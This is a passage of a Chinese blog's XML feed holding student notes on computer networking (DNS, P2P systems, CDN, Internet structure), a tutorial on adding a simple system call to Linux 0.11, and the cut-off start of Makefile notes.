alt="08"></p><p>然后还要知道的是，<code>DNS</code>的报文格式，请求报文和响应报文的格式是一样的，通过<code>flag</code>来区分是请求报文还是响应报文，还有一个<code>ID</code>头部，用来区分是哪台主机请求的查询服务，到时候好返回结果。还有用<code>flag</code>字段来表明是采用递归方式查询还是迭代方式查询。</p><p>还有关于第三个问题，如何维护记录的问题。新增一条记录，如果是关于一个子域的，那么需要加两条记录一条是从子域名到子域域名服务器的域名的映射，还有一条是子域域名服务器的域名到其<code>IP</code>地址的映射；如果是关于一台主机的话，直接就是主机域名到主机<code>IP</code>地址的映射。</p><p>为什么要将域名和域名服务器的域名区分开来呢？首先，域名是公布给用户使用的，它应该是便于记忆且唯一的，而域名服务器需要公司自己去管理，它可能有很多台，遍布在很多地方，所以需要一个自己的特定域名作为编号方便管理吧。而且，一个DNS中的有关同一子域名的记录可能会有多个子域域名服务器的映射，DNS可以根据当时的网络情况进行选择子域的域名服务器。</p><p>或者说，域名就是一个逻辑上的东西，DNS服务器其实也是一台服务器，也是一台主机呀，作为这个逻辑域名的一部分自然也需要一个物理域名加以区分。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/09.png" alt="09"></p><h2 id="P2P应用"><a href="#P2P应用" class="headerlink" title="P2P应用"></a>P2P应用</h2><p>前面我们提到，网络架构分为 <code>C/S</code>架构 和 <code>P2P</code>架构，下面我们重点介绍<code>P2P</code>架构，在这之前简单讲一下<code>C/S</code>式模式的文件分发时间作为对照。</p><p>假设要传输文件的大小为 <code>F</code>，服务器的上载带宽为 U<del>s</del>，有 N 个客户端需要下载文件，每个客户端的下载带宽为 d<del>i</del> 。<br>那么我们可以得出将所有文件分发给 N 个服务器的耗时为 D<del>C-S</del> &gt;&#x3D; max{ NF &#x2F; U<del>s</del>，F &#x2F; d<del>min</del>}，就是从服务器和客户端选个发送速度最慢的。这样来看，如果客户端数量很少，这个传输时间还是可以接受的，但是客户端数量一旦上来了，服务器所有承受的压力从图上来看是线性的增加。传播时间是不可控的，当下载量上来后，服务器的上载带宽就成了瓶颈</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/10.png" alt="10"></p><p>如果采用<code>P2P</code>架构，这个文件的传输时间就会变成下图这样。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/11.png" alt="11"></p><p>假设，这个时候<code>P2P</code>的架构已经搭建好了，当 N 个客户端请求文件时，服务器的荷载将会分配个其它客户端承担，这样原来服务器的上载时间就会降下来，从而不再成为瓶颈，慢慢的瓶颈就会变成客户端自己的下载带宽。</p><p><code>P2P</code>架构模式也有分类，首先大致分为 <strong>非结构化P2P</strong> 和 <strong>DHT(分布式散列表)结构化P2P</strong>。<code>DHT结构化P2P</code>属于高级计算机网络的知识，这里老师没有过多探讨。大致的分类区别就是，非结构化的P2P，客户端之间的连接(overlay)是没有规律或者说规则可寻的，能碰上连接就连接，想连就连，所有客户端形成的逻辑网络是混乱的。反之，结构化的P2P中的客户端之间的<strong>overlay</strong>组成的网络可以是一个环、一个树这样的数据结构，是有规律的。</p><p>非结构化的P2P具体分为以下几类，老师依据以下几类举出了几个应用实例来讲解。</p><h3 id="集中式目录"><a href="#集中式目录" class="headerlink" title="集中式目录"></a>集中式目录</h3><p>最初的 <strong>Napster</strong> 就是用这样的架构设计的。服务器并直接参与文件的上传和下载，也就是说服务器不会存储文件，它只维护一个目录表，这个表记录些什么呢？比如用户是否在线，用户客户端的IP地址，以及用户客户端都存储了些什么文件。这就需要客户端做出一些配合，比如每个用户在客户端上线时就会向服务器发送自己的IP地址，和自己都存储哪些文件。然后如果某个用户需要什么文件，他就会向服务器发送自己需要什么文件，服务器检索一下哪个客户端有这个文件，然后发送这个客户端的IP地址返回给请求方。然后这两个客户端之间建立连接，在它们之间收发文件。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/12.png" alt="12"></p><p>当然，这种模式的弊端也非常大，整个网络的核心就是这个集中式目录服务器。<strong>Napster</strong> 在校园网里做 mp3 公益服务，侵犯了版权方的利益，对他做的惩罚就是拔掉了服务器的插头。至此整个 Napster 的网络也就宕机了。</p><h3 id="完全分布式"><a href="#完全分布式" class="headerlink" title="完全分布式"></a>完全分布式</h3><p><strong>Gnutella</strong> 就是这样一一个完全分布式的应用，没有中间服务器提供服务，网络完全由客户端构成。</p><p>假设这个网络已经构建成了。那么大致的结构是张这个样子的。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/13.png" alt="13"></p><p>节点与节点之间构成“邻居”关系。如果一个客户端需要下载某个文件，它是如何实现的呢？假设请求方为 X，它有很多邻居 Y</p><ol><li>对等方X必须首先发现某些已经在覆盖网络中的其他对 等方：使用可用对等方列表 自己维持一张对等方列表（经常开机的对等方的IP） 联系维持列表的Gnutella站点 </li><li>X接着试图与该列表上的对等方建立TCP连接，直到与 某个对等方Y建立连接 </li><li>X向Y发送一个Ping报文，Y转发该Ping报文 </li><li>所有收到Ping报文的对等方以Pong报文响应 IP地址、共享文件的数量及总字节数 </li><li>X收到许多Pong报文，然后它能建立其他TCP连接</li></ol><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/14.png" alt="14"></p><p>这种查询方式容易造成<strong>网络泛洪</strong>，造成网络资源的浪费。限制这种网络泛洪的方式也很简单，每个报文设置一个<code>TTL</code>就行了</p><p>那么 Gnutella 网络是如何建立起来的呢。首先，用户在安装客户端软件的时候，会有一个<strong>配置文件</strong>，这个配置文件里会有一些IP地址，关于这些IP地址老师讲的也不是很清晰，我大概猜测有两种可能，第一种是这个IP地址是经常活跃的一些用户，作为常驻用户，新用户通过这些常驻用户来加入网络，并通过它们的<code>ping pong</code>来和其它节点建立<code>overlay</code>；第二种这个IP地址可能是与Gnutella无关的服务器，用户通过这些向Gnutella无关的服务器发送<code>ping</code>，由它们作为跳板向其它地方转发，而当有Gnutella运行的客户端接收到这个<code>ping</code>后就会响应<code>pong</code>，由此通过第三者的方法建立<code>overlay</code>的方法。不过老师一直说”死党”什么的，我觉得第二种的可能性会高一点。</p><h3 id="混合体"><a href="#混合体" class="headerlink" title="混合体"></a>混合体</h3><p>就是将上述两种方式结合起来的P2P架构。这种方式将节点分为大节点和小节点。其中小节点和大节点之间的关系就像第一种集中式目录的关系一样，大节点存储目录表，在同一组的小节点之前收发文件；而大节点和大节点之间的关系就像第二种一样是完全分布式的，如果同一组的小节点没有想要的资源，通过大节点进行泛洪查询向其它大节点询问其组有没有我想要的资源，然后两个小节点之间跨组进行文件传输（应该是这样。</p><p><strong>KaZaA</strong>就是这样的一个应用</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/15.png" alt="15"></p><p>此外，老师还讲述了在这种架构下文件的查询方式。大节点建立一个关于文件的表格，其中主要包括以下字段：文件、文件描述信息、由文件字节序列得出的32位Hash值。这个Hash值就像文件的唯一ID一样。比如当一个小节点想要查询一首歌时，它向大节点发送这首歌的信息比如歌手、歌曲类别等等，大节点会根据这个模糊的描述信息将符合描述信息的所有文件的Hash值返回给小节点，小节点再细细的选择一个，当它决定了要具体的哪首歌后，就返回这个Hash值，Hash值作为文件的唯一标识符，当然也能唯一定位一首歌了。然后返回其它拥有这首歌的小节点的IP地址，让它们自己去通信。</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>其实关于<strong>CDN</strong>本身的内容其实并不复杂，不过老师以流媒体为例讲述了CDN工作的原理。</p><p><strong>CDN</strong>，Content Distribution Networks，内容分发网络。它作为和<code>IPS</code>和<code>ICS</code>差不多的存在，作为现代网络不可少的网络组成部分，有着和它们同样不小的地位。同样有很多公司做<code>CDN</code>向<code>ICS</code>提供服务。</p><p>在这之前先讲述一下流媒体在网络中是如何工作的。</p><p><strong>DASH</strong>，Dynamic Adaptive Streaming over HTTP，动态自适应流化 over HTTP技术。这个具体是什么呢。我们在浏览网页视频的时候，视频从服务器发送过来并不是一整包发过来的，而是将视频文件分成一块一块的发送过来。而整个视频文件其实有很多不同画质的版本。浏览器申请视频资源时就是在这些不同画质的不同切片之间根据当时的网络情况进行跳跃的。至于视频被分成了几片，每片都放在什么地方，这些东西都存储在了一个叫做<strong>manifest</strong>的告知文件当中，浏览器一开始请求视频时就会收到这个文件，然后根据这个文件去请求视频。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/16.png" alt="16"></p><p>CDN 其实就是作为一个服务器的拷贝，能够让不同地区用户访问离自己比较近的服务器从而得到比较快的响应。而像流媒体这样的公司就需要提前将这些不同视频的切片放到CDN服务器上。到时候浏览器想要获取视频资源切片时有两种方法。第一种是向源服务器发送请求，源服务器的权威域名服务器会返回一个CDN域名作为重定向，这个域名经过CDN的权威域名服务器解析返回一个离用户最近的CDN主机IP地址；第二种就是浏览器自己根据需要，从<strong>manifest</strong>告知文件中取得各个切片所在的CDN服务器的IP地址，发送请求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【中科大计算机网络】概述</title>
      <link href="/2024/06/20/%E3%80%90%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%91%E6%A6%82%E8%BF%B0/"/>
      <url>/2024/06/20/%E3%80%90%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%91%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Internet"><a href="#什么是Internet" class="headerlink" title="什么是Internet"></a>什么是Internet</h2><p>互联网是什么？以<code>TCP/IP</code>为主要构成的一簇协议，由这些协议构成的网络、世界上使用人数最大的网络，叫做<strong>互联网（Internet）</strong>。但是同样以<code>TCP/IP</code>为主要协议进行工作的网络，个人用的、公司用的不接入互联网的网络叫做<strong>内部网（intranet）</strong></p><p>协议：协议是对等层实体在通信过程当中应该遵守的<strong>规则的集合</strong>，是一个标准，是一个规范。<br>这个规则包含很多，包括：语法、语义、时序和动作等。</p><p>协议 定义了在两个或多 个通信实体之间交换的 报文格式和次序，以及 在报文传输和&#x2F;或接收或 其他事件方面所采取的 动作</p><p>互联网由分布式的应用程序（进程）及为这些应用程序提供通信服务的基础设施。基础设施包括什么，包括了主机当中应用层以下的所有的运行中的协议实体，包括了目标主机当中的应用层以下的应用实体，还包括了应用通信过程中所必要的网络。分布式的应用是网络存在的理由，基础设施为分布式的应用提供通信服务</p><p>网络结构组成如下有：核心、接入和边缘。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter1/00.png" alt="00"></p><h2 id="核心-Core-的工作方式"><a href="#核心-Core-的工作方式" class="headerlink" title="核心(Core)的工作方式"></a>核心(Core)的工作方式</h2><h3 id="电路交换-线路交换"><a href="#电路交换-线路交换" class="headerlink" title="电路交换 &#x2F; 线路交换"></a>电路交换 &#x2F; 线路交换</h3><p>主机和主机之间会一直占用通信链路的资源，不管两者之间有没有在通信。这种通信方式保证了通信双方数据交换的稳定性。</p><p>为了能够提供多组主机之间的通信，电路交换有了<code>pieces</code>的概念，将链路带宽分成多分交给每组主机用，分片的方式有 频分(FDM)根据频率分带宽、时分(TDM)根据时间周期内的时间片分、码分、波分等等。</p><p>因为主机之间不管有没有在通信都会占用链路资源，所以电路交换的方式所能提供的用户是有限的，比如带宽为 1Mbps，每个用户占用链路带宽为 1Bbps，那么这段链路撑死也就支持 10 个用户，再多就得切断一组用户的通信。</p><p>而分组交换因为有<strong>存储</strong>的概念，所以还能提供给更多的用户在用户突发网络请求的情况下。</p><h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><p>主机和主机之间的通信不再使用通信链路的<code>pieces</code>，而是使用它带宽的全部。</p><p>主机和主机之间的通信数据被分成一个个单位，这个单位叫 <strong>分组</strong> 或者 <strong>包(packet)</strong>，包在越过每个通信链路的时候使用带宽的全部，数据在传输过程中每一个节点时，以分组为单位进行<strong>存储-转发</strong>。最终由源主机发送到目标主机。</p><p>为什么在传输过程中的节点需要对分组进行先存储再转发呢？不进行存储，遇到一个比特就转发一个比特不行吗？如果用这种方式的话，如果传输的数据非常大，比如说 10 个 G，这样的话这一组的数据交换会持续很长的一段时间，并且一直占用这段链路，其它主机无法用这段链路进行通信。这就造成很大的问题。</p><p>边缘系统该如何接入核心呢？如果重新设计接入链路，每家每户都接一个成本是巨大的。于是运营商就在电话线上做文章。以前电话线通过电话线是以 4KHz 进行传播通信的，为了用已有的电话线进行进行上网就有了<strong>调制解调器</strong>，俗称猫(modem的谐音)，将数字信号调制成不同频率不同波长比如说 2KHz 到 3KHz，然后发送到链路上。核心那边的接收端也是通过猫来区分传过来的信号的是要上网还是打电话。但是这样的问题是，打电话时不能上网，上网时不能打电话，因为在做一个行为的时候链路总是被占用的。所以这种方式被淘汰了。</p><h3 id="虚拟电路交换技术"><a href="#虚拟电路交换技术" class="headerlink" title="虚拟电路交换技术"></a>虚拟电路交换技术</h3><p>由于分组太多，不同的分组又会走不同的线路，所以会发生很多不可预知的数据丢失的情况。为了解决这个问题，分组交换技术吸取电路交换的有点，两个主机交换数据前会先进行沟通采用哪条线路，保证它们之间的线路是稳定安全的，之后在分组(packet)上打上这条线路的记号，然后所有的信息交换都在这个线路上进行。但是这种方式无疑是会增加开销的，而且是增加<strong>核心部分</strong>的开销，事实上<strong>核心部分</strong>要负责的内容应该仅仅只是保证数据的快速传输和快速的选择路线，而不是解决主机提出来的这种新要求。所以现代并没有采用虚拟电路交换技术，数据包丢失的问题交给主机自己去解决，主机有强大的算力完全有能力去解决。</p><h2 id="Internet-和-ISP"><a href="#Internet-和-ISP" class="headerlink" title="Internet 和 ISP"></a>Internet 和 ISP</h2><ul><li>端系统(个人电脑、服务器、移动手机等)通过**接入ISP(Internet Service Providers)**连接到互联网。<ul><li>接入ISP有很多，比如公司的、大学的ISP</li></ul></li><li>接入ISP必须是互联的，这样任何两个端系统才可以相互发送分组到对方</li></ul><h3 id="global-ISP"><a href="#global-ISP" class="headerlink" title="global ISP"></a>global ISP</h3><p>在全球范围部署路由器用链路连在一起，然后让端系统通过 access net 连接到上述组成的 global ISP 实现全球范围内数据的收和发。</p><p>因为这个东西的利益是巨大的，就会有很多厂商构建 global ISP。不同厂商会有自己的一批客户，为了让不同厂商的客户实现互联，厂商之间就会进行合作，将各自的 global ISP中间搭一条线路进行连接，还有一种方式就是搭建一个 **IXP(Internet exchange poin)**互联网交换点，在这个交换点中完成流量的交换。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter1/01.png" alt="01"></p><h3 id="regional-ISP"><a href="#regional-ISP" class="headerlink" title="regional ISP"></a>regional ISP</h3><p>前面这些大头将全球范围的ISP搭建好骨干网后就需要更一些小厂商给小区域比如说省市、城镇做更精细的划分。做到业务上的细分。</p><h3 id="ICP"><a href="#ICP" class="headerlink" title="ICP"></a>ICP</h3><p><strong>Internet Content Provider</strong>，互联网内容提供商，比如说百度、谷歌提供业务。这些厂商同样需要 ISP 接入互联网，这就需要交钱了，因为这些厂商的用户量是巨大的，这样造成的成本也是巨大的。为了解决这一问题，他们就会在全球各个地方建造自己的机房，叫做 <strong>DC(Data Center)</strong>，然后自己部署自己的专用的网络连接这些 DC，自己拉光缆将 DC 连接起来。</p><p>这些 DC 部署的位置也是有讲究的，都是靠近核心ISP比较近的地方，这样用户通过 ISP 连接 DC 的速度也会快一点。如果用户申请的服务在 DC1 中没有，它也能够通过自己的专有网络快速从其它 DC 中找到，然后拉取过来发给客户。此外 DC机房还需要建在温度低，散热快，且事故发生比较少的地方，比如说贵州就有很多的机房，北极也有机房、海底也有机房。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter1/02.png" alt="02"></p><p>ISP 其实是分层的 ISP，端系统接入最低层的 ISP，有需要时低层 ISP 会向高层 ISP 发送数据，让远在两端的主机实现通信。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter1/03.png" alt="03"></p><p>网络非常复杂的功能分解为若干功能明确的层次，每一层实现一个或一组功能</p><p>上层的模块可以通过接口使用本层内部的一些功能，这些功能的子集叫做<strong>服务</strong>，服务是功能的一部分</p><p>本层实体借助下层所提供的<strong>服务</strong>，来跟对等层实体交换<strong>PDU</strong>，再经过内部处理，实现更复杂、更新的<strong>功能</strong>，通过层间的<strong>接口</strong>再向上层提供更好的<strong>服务</strong>。比如操作系统提供的<code>Socket API</code>，就是传输层向应用层提供的服务</p><p>本层协议实体在交互的过程当中，应该遵守的规则的集合叫做<strong>协议</strong>，协议的<strong>目的</strong>是向上层提供更好的服务，协议<strong>怎么实现</strong>？通过层间的接口访问下层所提供的服务来实现。</p><p><strong>服务提供者</strong>向<strong>服务用户</strong>提供服务，具体在哪里提供服务，在层间界面上**服务访问点(SAP)**提供服务，用来区分不同的服务用户。同一个服务提供者可能需要为多个上层用户提供服务，比如 <code>TCP实体</code> 可能需要向 <code>telnet应用</code>、<code>http应用</code>、<code>ftp应用</code>等同时提供服务，这时候就需要 <code>SAP</code> 来区分</p><p>服务提供者通过什么样的形式为服务用户提供用户，服务用户通过什么形式来使用服务提供者提供的服务。这个形式称作——<strong>原语(primitive)</strong>。比如说<code>Socket API</code>中的函数就叫做原语，原语就是提供服务的形式，服务用户到底采用服务提供者的什么服务，服务用户通过提供者提供的原语来告诉提供者我要用什么样的服务。</p><p>下层服务为两个上层应用提供服务进行通信之前，要有一个握手的过程，为之后的通信做好准备，这种类型的服务称作为<strong>面向连接的服务</strong>。反之通信之前没有握手的过程，就是<strong>无连接的服务</strong>。</p><p>上层传过来的 <strong>SDU(服务数据单元)</strong> 再加上本层的一些控制信息（头部），形成本层的 <strong>PDU(协议数据单元)</strong></p><p>物理层接收上一层传过来的比特，转化为光电信号，发送给目标；目标物理层再把这个信号转回比特。</p><p>在目标<strong>链路层</strong>，将物理层传过来的比特进行划分，分装成<strong>帧</strong>。链路层在物理层提供的服务的基础之上，相邻两**点(Point)**进行传输以帧为单位的数据，是 <strong>P2P</strong> 的关系</p><p>网络层在链路层提供的<strong>点到点</strong>的数据传输的基础之上，提供以<strong>分组</strong>为单位的<strong>端到端</strong>的数据传输的服务。实现主机到主机的数据传输。</p><p><strong>传输层</strong>在主机到主机传输的基础之上，完成进程到进程的区分；此外，网络层提供的服务是不可靠的，传输层还需要自己为上层应用提供可靠的传输服务</p><p><strong>应用层</strong>在传输层提供的服务的基础之上，完成<strong>应用报文</strong>和应用报文之间的交换</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter1/04.png" alt="04"></p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter1/05.png" alt="05"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在linux0.11上添加内核函数</title>
      <link href="/2024/05/26/%E5%A6%82%E4%BD%95%E5%9C%A8linux0.11%E4%B8%8A%E6%B7%BB%E5%8A%A0%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0/"/>
      <url>/2024/05/26/%E5%A6%82%E4%BD%95%E5%9C%A8linux0.11%E4%B8%8A%E6%B7%BB%E5%8A%A0%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>原理不多说了，直接进入正题</p><h3 id="编写内核函数"><a href="#编写内核函数" class="headerlink" title="编写内核函数"></a>编写内核函数</h3><p>这里就简单的编写一个打印函数，用到内核中的<code>printk()</code>函数，所以加上头文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/kernel/who.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_whoami</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;I&#x27;m KYZEN.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写好了一个<code>.c</code>文件，但是这样还是不够的，在最终<code>make</code>的时候还需要将其编译为<code>.o</code>文件，以供链接。</p><p>修改同目录下的<code>Makefile</code>文件，在<code>OBJS</code>下添加<code>who.o</code>，并在结尾处添加<code>who</code>相关的规则</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OBJS  = sched.o system_call.o traps.o asm.o fork.o \</span><br><span class="line">panic.o printk.o vsprintf.o sys.o exit.o \</span><br><span class="line">signal.o mktime.o who.o</span><br><span class="line">...</span><br><span class="line">who.s who.o: who.c ../<span class="keyword">include</span>/linux/kernel.h</span><br></pre></td></tr></table></figure><p>这样就可以将<code>.c</code>文件变成二进制文件编入操作系统中了</p><h3 id="注册内核函数"><a href="#注册内核函数" class="headerlink" title="注册内核函数"></a>注册内核函数</h3><p>上面还只是定义内核函数，并没有告诉操作系统有这么个函数，所以还需要在系统调用表中注册这个函数。所谓注册，其实就是在头文件中添加函数的声明，这样我们在后面编写的系统调用函数能够通过这个头文件中的<code>sys_call_table[]</code>函数调用表链接到前面写的函数定义。</p><p>写在数组上面的声明主要是写给数组看的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/include/linux/sys.h */</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sys_setreuid</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sys_setregid</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sys_whoami</span><span class="params">()</span>; <span class="comment">/* 添加内核函数声明 */</span></span><br><span class="line"></span><br><span class="line">fn_ptr sys_call_table[] = &#123; ..., sys_setreuid,sys_setregid, sys_whoami &#125;; <span class="comment">/* 添加函数指针 */</span></span><br></pre></td></tr></table></figure><h3 id="编写系统调用函数前的准备"><a href="#编写系统调用函数前的准备" class="headerlink" title="编写系统调用函数前的准备"></a>编写系统调用函数前的准备</h3><p>由于系统调用函数是通过输入一个<strong>常量符号</strong>作为<code>sys_call_table[]</code>数组的下标去调用内核函数的，所以还需要将这个常量符号定义一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/include/unistd.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __LIBRARY__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_whoami72 <span class="comment">/* 在这里添加常量符号 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall0(type,name) \</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall1(type,name,atype,a) \</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall2(type,name,atype,a,btype,b) \</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall3(type,name,atype,a,btype,b,ctype,c) \</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __LIBRARY__ */</span></span></span><br></pre></td></tr></table></figure><p>在<code>int 0x80</code>中程序会比较系统调用号和系统调用总数的关系，所以还需要修改一下这个总数的数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* linux0.11/kernel/system_call.s */</span><br><span class="line">nr_system_calls = 72-&gt;73 /* 有几个系统调用函数就写几个 */</span><br><span class="line">...</span><br><span class="line">system_call:</span><br><span class="line">cmpl $nr_system_calls-1,%eax</span><br><span class="line">ja bad_sys_call</span><br></pre></td></tr></table></figure><h3 id="编写系统调用函数"><a href="#编写系统调用函数" class="headerlink" title="编写系统调用函数"></a>编写系统调用函数</h3><p>系统调用函数是作为调用内核函数的接口提供给用户使用的，它的作用就是走<code>int 0x80</code>然后调用相应的内核函数</p><p>这一块其实很简单，<code>linux</code>中已经为我们提供好了函数模板。就是<code>linux0.11/include/unistd.h</code>下的<code>_syscall0</code>、<code>_syscall1</code>、<code>_syscall3</code>宏函数</p><p>我们只需要调用这个宏函数就可以完成系统调用函数的定义</p><p>起初我本来想像<code>write()</code>函数一样定义在<code>linux0.11/lib</code>目录下的，但是不知道为什么会出现<code>error: undefined symbol _whoami referred from texe segment</code>报错。</p><p>没办法只能在测试程序中定义了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ~/test.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LIBRARY_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">_syscall0(<span class="type">int</span>,whoami)</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    whoami();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意一定要在测试程序中定义<code>_LIBRARY_</code>，否则是找不到<code>unistd.h</code>文件中的宏定义和系统调用号</p><p>不过可能会出现系统调用号未定义的行为，这是因为<code>Bochs</code>虚拟机中的<code>unistd.h</code>没有定义，在<code>/usr/include/unistd.h</code>里面再加上就好了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile学习</title>
      <link href="/2024/05/24/Makefile%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/05/24/Makefile%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Makefile学习笔记"><a href="#Makefile学习笔记" class="headerlink" title="Makefile学习笔记"></a>Makefile学习笔记</h1><h2 id="1个规则"><a href="#1个规则" class="headerlink" title="1个规则"></a>1个规则</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">目标: 依赖条件</span></span><br><span class="line">[tab] 命令</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello: hello.c</span></span><br><span class="line">gcc -o hello 